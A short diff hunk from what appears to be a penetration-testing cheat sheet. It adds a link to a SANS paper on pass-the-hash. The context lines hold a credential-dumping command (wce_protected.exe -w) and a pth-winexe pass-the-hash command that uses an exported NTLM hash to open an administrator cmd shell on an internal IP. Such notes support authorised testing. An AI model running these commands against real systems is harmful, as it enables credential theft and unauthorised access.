@@ -274,6 +274,7 @@ int main ()
 	* obtain cleartext passwords and hashes from a compromised Windows host
 	* ``` wce_protected.exe –w ```
 * pass the hash
+https://pen-testing.sans.org/resources/papers/gcih/pass-the-hash-windows-10-174913
 ```bash  
 export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
 pth-winexe -U administrator% //10.11.01.76 cmd
